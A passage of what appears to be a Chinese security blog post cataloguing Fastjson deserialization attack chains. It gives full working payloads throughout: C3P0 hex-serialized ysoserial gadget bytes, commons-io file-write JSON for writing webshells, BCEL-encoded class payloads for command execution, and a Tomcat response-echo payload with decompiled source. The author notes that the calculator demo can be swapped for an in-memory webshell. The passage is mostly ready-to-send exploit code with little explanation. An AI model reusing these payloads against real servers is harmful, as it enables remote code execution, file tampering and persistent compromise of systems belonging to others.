dwB4AAIAAAABAHkAegADAFUAAAAEAAEAdQAJAHsAfAABAEIAAABqAAIAAgAAABG7AA5ZtwA9V6cACEwrtgA+sQABAAAACAALADwAAwBDAAAAFgAFAAAAUgAIAFUACwBTAAwAVAAQAFYARAAAABYAAgAMAAQAfQB+AAEAAAARAH8AgAAAAGYAAAAHAAJLBwBuBAABAIEAAAACAII="],"_name":"a.b","_tfactory":{},"_outputProperties":{ },"_version":"1.0","allowedProtocols":"all"}

![](https://gitee.com/fuli009/images/raw/master/public/20230320091758.png)

![](https://gitee.com/fuli009/images/raw/master/public/20230320091801.png)

### C3P0二次序列化 之 hex序列化字节

此攻击链需服务器存在c3p0依赖，否则不成功  

  *   *   *   *   *   *   *   *   *   * 

    
    
    <dependency>  <groupId>org.apache.commons</groupId>  <artifactId>commons-collections4</artifactId>  <version>4.0</version></dependency><dependency>  <groupId>com.mchange</groupId>  <artifactId>c3p0</artifactId>  <version>0.9.5.2</version></dependency>

使用yso生成反序列化数据

  * 

    
    
    java -jar ysoserial-all.jar CommonsCollections2 "open -a Calculator" > ls.ser

生成poc

  *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   * 

    
    
    package com.exmple;  
    import com.alibaba.fastjson.JSON;import com.mchange.lang.ByteUtils;import com.mchange.v2.c3p0.WrapperConnectionPoolDataSource;  
    import java.io.*;import java.util.Arrays;  
    public class C3P0Test {    public static void main(String[] args) throws IOException, ClassNotFoundException {        InputStream in = new FileInputStream("/Users/ajie/Desktop/calc.ser");        byte[] data = toByteArray(in);        in.close();        String HexString = bytesToHexString(data, data.length);        System.out.println(HexString);        String poc ="{\"e\":{\"@type\":\"java.lang.Class\",\"val\":\"com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\"},\"f\":{\"@type\":\"com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\",\"userOverridesAsString\":\"HexAsciiSerializedMap:"+HexString+";\"}}";        System.out.println(poc);  
        }  
        public static byte[] toByteArray(InputStream in) throws IOException {        byte[] classBytes;        classBytes = new byte[in.available()];        in.read(classBytes);        in.close();        return classBytes;    }  
        public static String bytesToHexString(byte[] bArray, int length) {        StringBuffer sb = new StringBuffer(length);  
            for(int i = 0; i < length; ++i) {            String sTemp = Integer.toHexString(255 & bArray[i]);            if (sTemp.length() < 2) {                sb.append(0);            }  
                sb.append(sTemp.toUpperCase());        }        return sb.toString();    }}  
    

  * 

    
    
    {"e":{"@type":"java.lang.Class","val":"com.mchange.v2.c3p0.WrapperConnectionPoolDataSource"},"f":{"@type":"com.mchange.v2.c3p0.WrapperConnectionPoolDataSource","userOverridesAsString":"HexAsciiSerializedMap:ACED0005737200176A6176612E7574696C2E5072696F72697479517565756594DA30B4FB3F82B103000249000473697A654C000A636F6D70617261746F727400164C6A6176612F7574696C2F436F6D70617261746F723B787000000002737200426F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E73342E636F6D70617261746F72732E5472616E73666F726D696E67436F6D70617261746F722FF984F02BB108CC0200024C00096465636F726174656471007E00014C000B7472616E73666F726D657274002D4C6F72672F6170616368652F636F6D6D6F6E732F636F6C6C656374696F6E73342F5472616E73666F726D65723B7870737200406F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E73342E636F6D70617261746F72732E436F6D70617261626C65436F6D70617261746F72FBF49925B86EB13702000078707372003B6F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E73342E66756E63746F72732E496E766F6B65725472616E73666F726D657287E8FF6B7B7CCE380200035B000569417267737400135B4C6A6176612F6C616E672F4F626A6563743B4C000B694D6574686F644E616D657400124C6A6176612F6C616E672F537472696E673B5B000B69506172616D54797065737400125B4C6A6176612F6C616E672F436C6173733B7870757200135B4C6A6176612E6C616E672E4F626A6563743B90CE589F1073296C02000078700000000074000E6E65775472616E73666F726D6572757200125B4C6A6176612E6C616E672E436C6173733BAB16D7AECBCD5A990200007870000000007704000000037372003A636F6D2E73756E2E6F72672E6170616368652E78616C616E2E696E7465726E616C2E78736C74632E747261782E54656D706C61746573496D706C09574FC16EACAB3303000649000D5F696E64656E744E756D62657249000E5F7472616E736C6574496E6465785B000A5F62797465636F6465737400035B5B425B00065F636C61737371007E000B4C00055F6E616D6571007E000A4C00115F6F757470757450726F706572746965737400164C6A6176612F7574696C2F50726F706572746965733B787000000000FFFFFFFF757200035B5B424BFD19156767DB37020000787000000002757200025B42ACF317F8060854E00200007870000006A6CAFEBABE0000003200390A0003002207003707002507002601001073657269616C56657273696F6E5549440100014A01000D436F6E7374616E7456616C756505AD2093F391DDEF3E0100063C696E69743E010003282956010004436F646501000F4C696E654E756D6265725461626C650100124C6F63616C5661726961626C655461626C6501000474686973010013537475625472616E736C65745061796C6F616401000C496E6E6572436C61737365730100354C79736F73657269616C2F7061796C6F6164732F7574696C2F4761646765747324537475625472616E736C65745061796C6F61643B0100097472616E73666F726D010072284C636F6D2F73756E2F6F72672F6170616368652F78616C616E2F696E7465726E616C2F78736C74632F444F4D3B5B4C636F6D2F73756E2F6F72672F6170616368652F786D6C2F696E7465726E616C2F73657269616C697A65722F53657269616C697A6174696F6E48616E646C65723B2956010008646F63756D656E7401002D4C636F6D2F73756E2F6F72672F6170616368652F78616C616E2F696E7465726E616C2F78736C74632F444F4D3B01000868616E646C6572730100425B4C636F6D2F73756E2F6F72672F6170616368652F786D6C2F696E7465726E616C2F73657269616C697A65722F53657269616C697A6174696F6E48616E646C65723B01000A457863657074696F6E730700270100A6284C636F6D2F73756E2F6F72672F6170616368652F78616C616E2F696E7465726E616C2F78736C74632F444F4D3B4C636F6D2F73756E2F6F72672F6170616368652F786D6C2F696E7465726E616C2F64746D2F44544D417869734974657261746F723B4C636F6D2F73756E2F6F72672F6170616368652F786D6C2F696E7465726E616C2F73657269616C697A65722F53657269616C697A6174696F6E48616E646C65723B29560100086974657261746F720100354C636F6D2F73756E2F6F72672F6170616368652F786D6C2F696E7465726E616C2F64746D2F44544D417869734974657261746F723B01000768616E646C65720100414C636F6D2F73756E2F6F72672F6170616368652F786D6C2F696E7465726E616C2F73657269616C697A65722F53657269616C697A6174696F6E48616E646C65723B01000A536F7572636546696C6501000C476164676574732E6A6176610C000A000B07002801003379736F73657269616C2F7061796C6F6164732F7574696C2F4761646765747324537475625472616E736C65745061796C6F6164010040636F6D2F73756E2F6F72672F6170616368652F78616C616E2F696E7465726E616C2F78736C74632F72756E74696D652F41627374726163745472616E736C65740100146A6176612F696F2F53657269616C697A61626C65010039636F6D2F73756E2F6F72672F6170616368652F78616C616E2F696E7465726E616C2F78736C74632F5472616E736C6574457863657074696F6E01001F79736F73657269616C2F7061796C6F6164732F7574696C2F476164676574730100083C636C696E69743E0100116A6176612F6C616E672F52756E74696D6507002A01000A67657452756E74696D6501001528294C6A6176612F6C616E672F52756E74696D653B0C002C002D0A002B002E0100126F70656E202D612043616C63756C61746F7208003001000465786563010027284C6A6176612F6C616E672F537472696E673B294C6A6176612F6C616E672F50726F636573733B0C003200330A002B003401000D537461636B4D61705461626C6501001D79736F73657269616C2F50776E6572323332393336343132353334363701001F4C79736F73657269616C2F50776E657232333239333634313235333436373B002100020003000100040001001A000500060001000700000002000800040001000A000B0001000C0000002F00010001000000052AB70001B100000002000D0000000600010000002F000E0000000C000100000005000F003800000001001300140002000C0000003F0000000300000001B100000002000D00000006000100000034000E00000020000300000001000F0038000000000001001500160001000000010017001800020019000000040001001A00010013001B0002000C000000490000000400000001B100000002000D00000006000100000038000E0000002A000400000001000F003800000000000100150016000100000001001C001D000200000001001E001F00030019000000040001001A00080029000B0001000C00000024000300020000000FA70003014CB8002F1231B6003557B1000000010036000000030001030002002000000002002100110000000A000100020023001000097571007E0018000001D4CAFEBABE00000032001B0A0003001507001707001807001901001073657269616C56657273696F6E5549440100014A01000D436F6E7374616E7456616C75650571E669EE3C6D47180100063C696E69743E010003282956010004436F646501000F4C696E654E756D6265725461626C650100124C6F63616C5661726961626C655461626C6501000474686973010003466F6F01000C496E6E6572436C61737365730100254C79736F73657269616C2F7061796C6F6164732F7574696C2F4761646765747324466F6F3B01000A536F7572636546696C6501000C476164676574732E6A6176610C000A000B07001A01002379736F73657269616C2F7061796C6F6164732F7574696C2F4761646765747324466F6F0100106A6176612F6C616E672F4F626A6563740100146A6176612F696F2F53657269616C697A61626C6501001F79736F73657269616C2F7061796C6F6164732F7574696C2F47616467657473002100020003000100040001001A000500060001000700000002000800010001000A000B0001000C0000002F00010001000000052AB70001B100000002000D0000000600010000003C000E0000000C000100000005000F001200000002001300000002001400110000000A000100020016001000097074000450776E727077010078737200116A6176612E6C616E672E496E746567657212E2A0A4F781873802000149000576616C7565787200106A6176612E6C616E672E4E756D62657286AC951D0B94E08B02000078700000000178;"}}

![](https://gitee.com/fuli009/images/raw/master/public/20230320091803.png)

命令执行可成功，那么也可以加在上面的内存马，将class文件序列为hex，然后执行。  

### Commons-io 写文件/webshell

低版本限制 fastjson 1.2.68  

服务端组件需加入

  *   *   *   *   * 

    
    
    <dependency>  <groupId>commons-io</groupId>  <artifactId>commons-io</artifactId>  <version>2.5</version></dependency>

Jre8 原始poc

  *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   * 

    
    
    {    "x":{        "@type":"java.lang.AutoCloseable",        "@type":"sun.rmi.server.MarshalOutputStream",        "out":{            "@type":"java.util.zip.InflaterOutputStream",            "out":{                "@type":"java.io.FileOutputStream",                "file":"/tmp/dest.txt",                "append":false            },            "infl":{                "input":"eJwL8nUyNDJSyCxWyEgtSgUAHKUENw=="  //网站路径 base64            },            "bufLen":1048576        },        "protocolVersion":1    }}  
    

![](https://gitee.com/fuli009/images/raw/master/public/20230320091807.png)

commons-io 2.0 - 2.6 版本：

  *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   * 

    
    
    {  "x":{    "@type":"com.alibaba.fastjson.JSONObject",    "input":{      "@type":"java.lang.AutoCloseable",      "@type":"org.apache.commons.io.input.ReaderInputStream",      "reader":{        "@type":"org.apache.commons.io.input.CharSequenceReader",        "charSequence":{"@type":"java.lang.String""aaaaaa...(长度要大于8192，实际写入前8192个字符)"      },      "charsetName":"UTF-8",      "bufferSize":1024    },    "branch":{      "@type":"java.lang.AutoCloseable",      "@type":"org.apache.commons.io.output.WriterOutputStream",      "writer":{        "@type":"org.apache.commons.io.output.FileWriterWithEncoding",        "file":"/tmp/pwned",        "encoding":"UTF-8",        "append": false      },      "charsetName":"UTF-8",      "bufferSize": 1024,      "writeImmediately": true    },    "trigger":{      "@type":"java.lang.AutoCloseable",      "@type":"org.apache.commons.io.input.XmlStreamReader",      "is":{        "@type":"org.apache.commons.io.input.TeeInputStream",        "input":{          "$ref":"$.input"        },        "branch":{          "$ref":"$.branch"        },        "closeBranch": true      },      "httpContentType":"text/xml",      "lenient":false,      "defaultEncoding":"UTF-8"    },    "trigger2":{      "@type":"java.lang.AutoCloseable",      "@type":"org.apache.commons.io.input.XmlStreamReader",      "is":{        "@type":"org.apache.commons.io.input.TeeInputStream",        "input":{          "$ref":"$.input"        },        "branch":{          "$ref":"$.branch"        },        "closeBranch": true      },      "httpContentType":"text/xml",      "lenient":false,      "defaultEncoding":"UTF-8"    },    "trigger3":{      "@type":"java.lang.AutoCloseable",      "@type":"org.apache.commons.io.input.XmlStreamReader",      "is":{        "@type":"org.apache.commons.io.input.TeeInputStream",        "input":{          "$ref":"$.input"        },        "branch":{          "$ref":"$.branch"        },        "closeBranch": true      },      "httpContentType":"text/xml",      "lenient":false,      "defaultEncoding":"UTF-8"    }  }}  
    

![](https://gitee.com/fuli009/images/raw/master/public/20230320091810.png)

commons-io 2.7 - 2.8.0 版本：

  *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   * 

    
    
    {  "x":{    "@type":"com.alibaba.fastjson.JSONObject",    "input":{      "@type":"java.lang.AutoCloseable",      "@type":"org.apache.commons.io.input.ReaderInputStream",      "reader":{        "@type":"org.apache.commons.io.input.CharSequenceReader",        "charSequence":{"@type":"java.lang.String""aaaaaa...(长度要大于8192，实际写入前8192个字符)",        "start":0,        "end":2147483647      },      "charsetName":"UTF-8",      "bufferSize":1024    },    "branch":{      "@type":"java.lang.AutoCloseable",      "@type":"org.apache.commons.io.output.WriterOutputStream",      "writer":{        "@type":"org.apache.commons.io.output.FileWriterWithEncoding",        "file":"/tmp/pwned",        "charsetName":"UTF-8",        "append": false      },      "charsetName":"UTF-8",      "bufferSize": 1024,      "writeImmediately": true    },    "trigger":{      "@type":"java.lang.AutoCloseable",      "@type":"org.apache.commons.io.input.XmlStreamReader",      "inputStream":{        "@type":"org.apache.commons.io.input.TeeInputStream",        "input":{          "$ref":"$.input"        },        "branch":{          "$ref":"$.branch"        },        "closeBranch": true      },      "httpContentType":"text/xml",      "lenient":false,      "defaultEncoding":"UTF-8"    },    "trigger2":{      "@type":"java.lang.AutoCloseable",      "@type":"org.apache.commons.io.input.XmlStreamReader",      "inputStream":{        "@type":"org.apache.commons.io.input.TeeInputStream",        "input":{          "$ref":"$.input"        },        "branch":{          "$ref":"$.branch"        },        "closeBranch": true      },      "httpContentType":"text/xml",      "lenient":false,      "defaultEncoding":"UTF-8"    },    "trigger3":{      "@type":"java.lang.AutoCloseable",      "@type":"org.apache.commons.io.input.XmlStreamReader",      "inputStream":{        "@type":"org.apache.commons.io.input.TeeInputStream",        "input":{          "$ref":"$.input"        },        "branch":{          "$ref":"$.branch"        },        "closeBranch": true      },      "httpContentType":"text/xml",      "lenient":false,      "defaultEncoding":"UTF-8"    }  }  
    

### BECL攻击，命令执行/内存马

编译poc，将poc的class字节码转化为bcel然后发送payload

  *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   * 

    
    
    package com.exmple;  
    import com.sun.org.apache.bcel.internal.classfile.Utility;  
    import java.io.BufferedWriter;import java.io.FileWriter;import java.io.IOException;import java.nio.file.Files;import java.nio.file.Path;import java.nio.file.Paths;  
    public  class Bcel {  
        public static void main(String[] args) throws IOException {        Path path = Paths.get("/Users/ajie/Desktop/fastjson/target/classes/com/exmple/Poc.class");        byte[] bytes = Files.readAllBytes(path);        System.out.println(bytes.length);        String result = Utility.encode(bytes,true);        BufferedWriter bw = new BufferedWriter(new FileWriter("res.txt"));        bw.write("$$BCEL$$" + result);        bw.close();    }}

  

  *   *   *   *   *   *   * 

    
    
    public class Poc{    public Poc(){        try{            Runtime.getRuntime().exec(new String[]{"open -a calculator"});        } catch (Exception e) {        }    }

  *   *   *   *   *   *   *   *   *   *   * 

    
    
    {    {        "x":{                "@type": "org.apache.tomcat.dbcp.dbcp2.BasicDataSource",                "driverClassLoader": {                     "@type": "com.sun.org.apache.bcel.internal.util.ClassLoader"                 },                 "driverClassName": "$$BCEL$$$l$8b$I$A$A$A$A$A$A$AeP$cbN$C1$U$3d$85$91$c1qx$L$8aOX$J$s$ca$c6$j$c6$8d$d1$d5$a8D$M$aeKm$b08L$c9P$M$7f$e4$da$8d$g$X$7e$80$l$a5$deA$p$Y$db$f4$de$de$d3$d3sz$fb$fe$f1$fa$G$e0$AU$H6$96$j$UQJb$r$ca$ab6$ca6$d6l$ac3$q$OU$a0$cc$RC$bcV$ef0X$c7$faF2d$3c$V$c8$f3$f1$a0$x$c3$x$de$f5$J$c9$7bZp$bf$c3C$V$d5$3f$a0en$d5$88$n$eb$J$3dh$c8$c9$60$e8$cbFK$8b$sC$aam$b8$b8$3b$e3$c3$vsjVfp$daz$i$Ky$aa$a2$cbIb$ee$f7$f9$3dw$91$c4$a2$8d$N$X$9b$d8$o$t$3d$94Ae$8fW$c8O$8c$7dnt$e8b$h$V$86B$c4n$f8$3c$e85N$sB$O$8d$d2$BC$fa$af9$3dgF$bb$e8$f6$a50$M$b9$Zt9$O$8c$g$90$bf$d3$93$e6$b7$u$d6$ea$de$3f$O$f5a$c9$89$q$c9$9d$da$dci$db$84$w$e85$e7$_$b4B$z$e4h$d4D$V$J$fa$edh0$9a$d4$XE$87$aa$3eb4$81$fc$ee3$d8$Lb$f9$f8$T$ac$eb$HX$de$p1$y$a4$90$c5$C$e2X$oN$89v$m$cc$o$ad$UidI1GJ$$$a1$$$b1I$85$f04$e5$M$ad$yb$9f$U$98$fd$jr$91s$9e$f0$Y$K_$e33$5d$f4$D$C$A$A"         },     }: "x" }  
    

![](https://gitee.com/fuli009/images/raw/master/public/20230320091813.png)

成功执行，把弹计算器的字节码替换为内存马，即可利用bcel写内存马。

### SpringEcho 回显

poc

  * 

    
    
    {"x":{{"@type":"com.alibaba.fastjson.JSONObject","name":{"@type":"java.lang.Class","val":"org.apache.ibatis.datasource.unpooled.UnpooledDataSource"},"c":{"@type":"org.apache.ibatis.datasource.unpooled.UnpooledDataSource","key":{"@type":"java.lang.Class","val":"com.sun.org.apache.bcel.internal.util.ClassLoader"},"driverClassLoader":{"@type":"com.sun.org.apache.bcel.internal.util.ClassLoader"},"driver":"$$BCEL$$$l$8b$I$A$A$A$A$A$A$A$a5Wyx$Ug$Z$ff$cd$5e3$3b$99$90dCB$W$uG$N$b09v$b7$a1$95B$c2$99$90$40J$S$u$hK$97P$db$c9$ec$q$3bd3$Tfg$J$a0$b6$k$d4$D$8fZ$8f$daPO$b4$ae$b7P$eb$s$U9$eaA$b1Z$8fzT$ad$d6zk$f1$f6$8f$da$f6$B$7c$bf$99$N$d9$84$ad$3c$3e$sy$be$f9$be$f7$7b$ef$f7$f7$be3y$fc$e2$p$a7$A$dc$80$7f$89$Q1$m$60P$84$PI$b6h$Cv$f3$Y$e2$91$f2$a3$E$c3$8c$a4$f30x$8c$88t$de$p$c2D$9a$JY$C2$ecr$_$8fQ$B$fb$E$ec$e7q$80$R$5e$c3$e3$b5$ec$f9$3a$R$d5$b8S$c4$5dx$3d$5b$de$m$e2$8dx$T$5b$O$K$b8$5bD7$de$cc$e3$z$ec$fcV$Bo$T$d1$84C$C$de$$$e0$j$3c$de$v$e0$5d$C$ee$R$f0n$k$f7$Kx$P$8f$f7$96$a0$B$efc$cb$fb$F$dc$t$e0$D$C$ee$e71$s$e00$T$bc$93$z$P$I$f8$a0$80$P$J$f8$b0$80$8f$88$f8$u$3e$c6$a8G$E$7c$5c$c0$t$E$3c$u$e0$93$C$b2$3c$3e$c5$e3$d3$o6$e03l$f9$ac$88$cf$e1$f3$o$d6$e3$L$C$be$c8$9eG$d9r$8c$89$3e$c4$7c$fc$S$d3$f4$b0$88$_$p$c7c$9c$83o$b5$a6k$d6Z$O$eeP$dd$z$i$3cmFB$e5P$d6$a5$e9jOf$b8_5$7b$e5$fe$UQ$fc$a3$a6f$a9$adFb$3f$879$a1$ae$dd$f2$5e9$9a$92$f5$c1$e8$d6$fe$dd$aab$b5$f4$b52$f1$d2$98$r$xC$dd$f2$88$zE$89$a4$U$da$b9$k$e2$m$b6$efS$d4$RK3$f44$H$ef$a0ju$90$c0$ca$o$aa$K$u1$cb$d4$f4$c1$96$ba$x$99xLPY8$I$ab$95$94$j$B$8f$e3$94$40$ca$_$r$97$c7$pd$_fdLE$ed$d0$98$fbe$bd$c6$b0$o$5b$edJ$d2$880$5d$Sz$b0$95C$ada$OF$e4$RYI$aa$R$cb$e6$88d$y$z$V$e9$cf$MDZ$f7$5bj$5b2$a3$PI8$81$afH8$89Sd$$$adZ$ec$82B$u$9b$f2$a9$z$r$a7$89$e2$eak$95p$gg$q$3c$8a$afr$u$9f$e94$87$8a$vR$a7n$a9$83$aa$c9$i$f9$g$8f$afK$f8$G$ceJx$M$e78$f0$Jc$H$cb$b6$84o2$3d$8bf$Y$ea1$ac$O$p$a3$t$$$e7$93C$rc$89$e8$9aa$7b$dd$9a$Z$YPM$w$e6$a8$v$8fpX8$r$dfc$c42J$b2$5b$b5$92$c6$94$b8$84$c7$f1$z$O$Lf$b2uhj$aa$90$eb$db8$c7$bc$7d$82R$_$e1$3b$f8$ae$84$ef$e1$fb$94v$JO$e2$H$S$7e$88$l$91$ebV$d2T$e5DZ$c2N$f4$91_$7d$F$95$eb$b5$afZ$q$fc$YO$91s$ea$3eU$91$f0$T$fc$94$f6I$cb$oG$7d$96l$S$$8$E$a6$84$b6gt$ddA$a0$cfJj$e9$da$eb$c8FR$d6$T$v$W$a0o0e$f4$cb$a9$7c$fc$8e$40AV$c4$R$d3P$d4t$da0$a98$b3l$WV$ddh$97$96$b6$q$fc$MO$b3$I$7eN$d07$d5$3d$iJ$c8$f4v5$3dB$f8dx$a7$d3fr$97$99$v$9f$JH$c2A$af$9a$b6TB$93$84_$e0$Zb$t$5c$Q$f6$ad$MY$f2$cb$89$c4$a4$u$cf$f8$94$e1$E$ed$8ctD$97$87$a9$v$7e$v$e1Y$fcJ$c2$afY$g$7c$a3$9a$9e0F$e9$9e$b8$o$94$T$82QT$a1c$b4_$d3$a3$e9$q$j$c3$ca$qpl$efc$8a$ac$ebLw$cd$94$5b$db$9c$40$5b3Z$w$e1$60$ea7$S$7e$8b$df$f1$f8$bd$84$3f$e0$8f$8c$f2$tR$b5k$83$84$e7p$5e$c2$9f$f1$94$84$bf$e0$af$S$b6$p$s$e1o$f8$3b$8f$7fH$f8$tsi$9eb$MG$H$e4$b4$b5$3bm$e8$d1$bd$99Tt$aay$a8$f9$a7$ac$9a$ea$40$8a$60$j$b5$812$zMN$a9g$d4$3f$df$cc$U$db$80a$f6P$w8$y$J$fd$f7f$b7$f1N$S$r$ba$3a$da$a9$a7$zYWHjv$a8$c8$40$m$U$f5$c6$b7$b5S$aa$8a$c8WP57$aaJJ6$d5$84$83$7e$O$eb$8b$d8$ee$bbB$b6$d0$d2d$bc$8e$Gf1$d4$c9$a6$5e$cd$cb$b1Py5$7d$af1D$3e$af$w63$af$q$V$NL$m$ef$f3$p$a62T$y$3d$M$ac$93$W$cb$LB$cd$X$s$7c$95$yO$ab$p$a9$x$r$V$b1$cc$88j$w$8e$d1$aab$f2l$da$T$e87$u$Mx$9a$dd$a1$9e$d0NFv$db$3d$bc$b4H$c0E$a3$xU2$a6$a9$ea$d6$qf$a6W7$3f4$a8$7fI$abs$d8d$g$Z$9a$W$c1$o$7c$f6$VC$Y1$3b$I$9b$ae$ed2$E$F$c5$d0$zYc$af$a2y$85$8e$b6$re3$a6$ee$c9$a8$E$b4$96$ba$9d$USZ$3b$a0$dao$c7N$96$88$ce$a2$n$f0Z$ba$7dx$c4$dao$f3$ed$9c$3e0$f6$d3$9c$Yv$a6$Lu$v$r$95$b1$z$bdJE$$$fbYb$Z$5d$c6$a8j$b6$c9l$uU$87$8a$f4$TK$b9$97Z$c3$b4$98$83$85Z$f2S$a1e$da$7b$tOt$S$da$a9$8fdhnQ$ea$86$d9k$3d$_$ac$Z$d1$82$L$S$af$J$V$bd$60$96$a5LZ$dd$a8$a6$b4az_$d1LZ$f6$f2$81$V$O$_$d6$3b$ba$ba$cfr$b0$9d$7f$a1zBu$7d$ad$O$fa$f2$99$d2$Y$b9$sT$a8$60$ea$86t$cc$$F$t$9d$96$e1$98$c6b$fa$e2$R$c1$7e$3c$e0$d8$x$9f$d6mt$ba$86$9e$i$3d$bd$f5$e3$e0$8e$d1$86$c3$cd$b4$fa$i$o$89$d0T$84$8b$b1r$a3$f4$91$e8$r$ea$8b$B$d7$E$dc$3d$e1$i$3c$dd$e1$80$d7w$S$be$b8$3b$c0$c7$e2$9e$87$m$c4$e2$5e$b6$e6$e0o$f4$9e$84$Yw7$Q$dd$d9$9d$40I$dc$3d$O$89$Il$dbp$8a$ed$89$b3tG$7d$O$b3$Ce$k$5bQ$98$u$e5$f5$k$5b$a2$d1$be$cd$e2P$b3$t$Q$b0m$G$w$3d$93$e6$c8D$d8$937Al$ddWS$d2$fe$ff$x9F$99$A$M$faN$ae$b0$9f$e3$98M$U$96$af$b5$u$a3$b5$83$f2$b6$89$b2$b4$99h$9dt$bf$9d8o$82$85$z8$80$$$dcG$rx$98h$e3$94$fe$e3T$80$d3$94$d5$a7$89$f3$F$f4$d2$_0$H$ee$e7a$f2x$d5$f3$d8$c8$e3$96$L$d8$c0c$H$8f$5b$R$cfW$ad$8e$caA$l$TN9$f0$A$dcv9Vr$b6$d7$U$96$f8$m$aa$c3$N9TugQ$da$ec$a1$C$cd$e9$c9$5ez$ae$f11H$tP$jo$YG$cd$e9FO$O$c1F$S$98$7b$944$96$a2$92$be$e4$ab$f3A$y$87D$eb$O$3a$dd$K$9e$y$95b$X$dd$dfF$f7$afF$Nn$t$ac$dc$81EPP$8b$E$c2$Y$m$feA$db$f1$Kx$$$80$e7$b1$8b$9c$ed$e1q$9b_$wpY$m$e1$3c$d8$dc$s$9dJ$A$d7$cd$ee$96$J$cc$cba$7e$e0$9a$J$y8$83$85$f4$d7$e5$5e3$bf$e1$d4$R$d7$f5$N$f3$97$f7$84$cf$ba$96$90$fb$8b$9a$3dAO$60q$O$d7$kvU$d1$ee$V$b4$hs$95$84$D$b5$q$d6$ec$Nz$l$c5$921$ee$a5$a07$b0$94$I$81el$J$d9WY$I$cd$be$y$f7$y$5d$d5$db$s$g$9a$7d$ee$V$7c$V$l$f4$jG$p$87$p$dc$a9$a0$af$8a$3f$8e$b0$L$cdBP$ID$f2$gY$fd$a3n$aa$3f$d5$3e$e8$a5$8dH$85o$f6$3b$X$d7$e5q$d3$U$b3o$3dyX7$c5$D$cb$c7q$3d$83$c8$Z41$9f$cfb$uH$89$be$e10$94$a0$9fI$be$d2$91tZ$a3$3c$e8$f7$5c$ee$88$K$9cc$7d$c0$e0$e5$b0$ae$f0N$g$89$7b$f2$96$fc$de$Z$96$e2d$c3$W$f1$b4$5c$cd$b3$hgz6$96$f7$ec$de$ff$c1$b3$c0$ca$J$ac$ca$a19$d0$c2$w$80$m$f5$7c$TY$5b$cd$5c$5cC$zO$dedQ$9d$a7$aee$d4u$O$b5Y$M$faO$60$7d$fc$E6$c4$83$e28Zsh$cba$e38$da$D$j9l$caas$O$9d$T$b8$89$e2$m$d7Jl$d7$c6P5w$M$VA$ff$E$b6$e4$d0$e50$Q$c5$97$85$ff$m$cfe$_$ae$9e$3c$b8$b8$ec$85$t$b2$f0la$8d$d9$D$99pYG$f0$earm$a5$a7$83$e9$p$I$d1$w$d0$c9O$cdZ$82$f9$84$f1E$84$ecZ$ccB$3d5$edZ$94S$dbV$90t$r$c9W$93$86$d9$84$ec$wh$84$f8$M$e6$e2$m$e6$e1$k$92$ba$9f$d0$7f$M$L$f0$M$W$e2$3c$Wq$d5X$ccu$e2Zn$L$96p$fb$b0$94$bb$h$cb$b8$a3$Iq$e7Q$e7$aa$40$bd$ab$92$90U$8b$88k9$9a$5c$x$b0$dc$b5$Ks$5d$eb$b0$c2$d5$86$h$5d$j$uqua$jy$b9$c6$b5$8d$feU$ed$b5$bb$ae$fc$o$aa9$k$L$b9K4$t$7c$f6$8e$c7$ed$3c$ee$a0$v$A$da$ca$d4d$b3x$f4s$X$f0$a4$3d$Yv$bc$84C$dby$uuR$c5$L$f0$bd$I$ef$r$g$3fn$5b$Q$f87$bc$ad$q$c3$e6y$82$d4$bb$a0$fe$H$d8$3e$ebc$Z$Q$A$A"}}:"a"}}

![](https://gitee.com/fuli009/images/raw/master/public/20230320091815.png)

反编译查看代码

  *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   * 

    
    
    package com.fastjson.vul;  
    import java.lang.reflect.Field;import java.util.List;import java.util.Scanner;  
    public class TomcatEcho {    public TomcatEcho() {    }  
        private static void writeBody(Object var0, byte[] var1) throws Exception {        Object var2;        Class var3;        try {            var3 = Class.forName("org.apache.tomcat.util.buf.ByteChunk");            var2 = var3.newInstance();            var3.getDeclaredMethod("setBytes", byte[].class, Integer.TYPE, Integer.TYPE).invoke(var2, var1, new Object[]{new Integer(0), new Integer(var1.length)});            var0.getClass().getMethod("doWrite", var3).invoke(var0, var2);        } catch (ClassNotFoundException var5) {            var3 = Class.forName("java.nio.ByteBuffer");            var2 = var3.getDeclaredMethod("wrap", byte[].class).invoke(var3, var1);            var0.getClass().getMethod("doWrite", var3).invoke(var0, var2);        } catch (NoSuchMethodException var6) {            var3 = Class.forName("java.nio.ByteBuffer");            var2 = var3.getDeclaredMethod("wrap", byte[].class).invoke(var3, var1);            var0.getClass().getMethod("doWrite", var3).invoke(var0, var2);        }  
        }  
        private static Object getFV(Object var0, String var1) throws Exception {        Field var2 = null;        Class var3 = var0.getClass();  
            while(var3 != Object.class) {            try {                var2 = var3.getDeclaredField(var1);                break;            } catch (NoSuchFieldException var5) {                var3 = var3.getSuperclass();            }        }  
            if (var2 == null) {            throw new NoSuchFieldException(var1);        } else {            var2.setAccessible(true);            return var2.get(var0);        }    }  
        static {        try {            boolean var0 = false;            Thread[] var1 = (Thread[])((Thread[])getFV(Thread.currentThread().getThreadGroup(), "threads"));  
